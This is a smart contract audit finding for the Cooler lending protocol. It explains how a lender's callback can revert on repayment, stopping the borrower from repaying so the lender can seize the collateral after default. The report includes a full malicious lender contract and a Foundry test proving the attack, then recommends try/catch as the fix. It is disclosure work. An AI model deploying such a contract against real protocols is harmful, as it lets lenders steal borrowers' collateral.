# Lender can block repayment by reverting on `onRepay()` callback
## Summary
The procotols implements a way to callback the lender at each important function call. There is such a callback in the `repayLoan()` function which allows the borrower to repay the loan.
If the lender implements the callbacks functionnality but reverts on `onRepay()` callback, this prevents the borrower from repaying the loan. The lender can then wait until the loan expires to claim the defaulted loan's collateral.

## Vulnerability Detail
In the `repayLoan()` function, this external call is made to the lender:
```solidity
File: Cooler.sol

L184: // If necessary, trigger lender callback.
        if (loan.callback) CoolerCallback(loan.lender).onRepay(loanID_, repaid_); // @audit lender can revert this call
        return decollateralized;
```
https://github.com/ohmzeus/Cooler/blob/c6f2bbe1b51cdf3bb4d078875170177a1b8ba2a3/src/Cooler.sol#L184

If the `onRepay()` function of the lender reverts, this permanently blocks the borrower from repaying his debt.
The lender can then wait until the loan defaults to "steal" the collateral.

## Impact
### Proof of Concept
Here is a malicious contract that can perform this attack:
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.0;

import {CoolerCallback} from "src/CoolerCallback.sol";
import {Cooler} from "src/Cooler.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";

contract MaliciousLender is CoolerCallback {
    address owner;
    constructor(address coolerFactory_) CoolerCallback(coolerFactory_) {
        owner = msg.sender;
    }
    
    // Revert on repay. This block borrower from repaying the loan
    function _onRepay(uint256, uint256) internal override {
        revert("Hahah you cannot repay");
    }

    function clearRequest(address cooler, uint256 reqID_) external returns (uint256 loanID){
        require(msg.sender == owner, "Only owner");
        ERC20 debt = Cooler(cooler).debt();
        uint256 amount = Cooler(cooler).getRequest(reqID_).amount;
        debt.transferFrom(msg.sender, address(this), amount);
        debt.approve(cooler, amount);
        loanID = Cooler(cooler).clearRequest(reqID_, true, true);
    }

    function claimDefaulted(address cooler, uint256 loanID_) external {
        Cooler(cooler).claimDefaulted(loanID_);
        withdraw(address(Cooler(cooler).collateral()));
    }

    function withdraw(address token) public {
        require(msg.sender == owner, "Only owner");
        ERC20(token).transfer(msg.sender, ERC20(token).balanceOf(address(this)));
    }

    function _onRoll(uint256, uint256, uint256) internal override {/* Do nothing */}
    function _onDefault(uint256, uint256, uint256) internal override {/* Do nothing */}
}
```
You can add this test to `Cooler.t.sol` to showcase the attack process.
```solidity
function test_EXPLOIT_Lender_blocks_repaiment() public {
    // test inputs
    uint256 reqAmount_ = 1000e18;
    uint256 repayAmount_ = reqAmount_/2;
    // test setup
    cooler = _initCooler();
    (uint256 reqID, ) = _requestLoan(reqAmount_);
    uint256 initCoolerCollat = collateral.balanceOf(address(cooler));
    assertEq(collateral.balanceOf(address(lender)), 0); // Lender starts with 0 collateral tokens
    console2.log("collateral: cooler balance = ",collateral.balanceOf(address(cooler)));
    console2.log("collateral: lender balance = ",collateral.balanceOf(address(lender)));

    // Lender creates MaliciousLender contract and clear the loan request
    vm.startPrank(lender);
    MaliciousLender maliciousLender = new MaliciousLender(address(coolerFactory));
    debt.approve(address(maliciousLender), reqAmount_);
    uint256 loanID = maliciousLender.clearRequest(address(cooler), reqID);
    vm.stopPrank();

    // block.timestamp < loan expiry
    vm.warp(block.timestamp + 15 days);
    console2.log("15 days passed...");

    vm.startPrank(owner);
    // Aprove debt so that it can be transferred by cooler
    debt.approve(address(cooler), repayAmount_);
    // Owner can't repay the loan because transactionis reverted by maliciousLender
    vm.expectRevert("Hahah you cannot repay");
    cooler.repayLoan(loanID, repayAmount_);
    vm.stopPrank();
    console2.log("[-] Owner was not able to repay his loan");

    // block.timestamp > loan expiry
    vm.warp(block.timestamp + DURATION + 1);
    console2.log("Few days passed, loan is now exipred...");

    // Lender claims the defaulted loan
    vm.startPrank(lender);
    debt.approve(address(maliciousLender), reqAmount_);
    maliciousLender.claimDefaulted(address(cooler), loanID);
    vm.stopPrank();
    console2.log("[+] Lender claimed faulted loan");

    assertEq(collateral.balanceOf(address(lender)), initCoolerCollat); // Lender got all the collateral tokens
    assertEq(collateral.balanceOf(address(cooler)), 0); // Lender got all the collateral tokens
    console2.log("collateral: cooler balance = ",collateral.balanceOf(address(cooler)));
    console2.log("collateral: lender balance = ",collateral.balanceOf(address(lender)));
}
```

## Tool used

Manual Review + Foundry

## Recommendation
One way to prevent this issue is by adding a try/catch statement around the callback statements (apply this to `onRoll()` too).
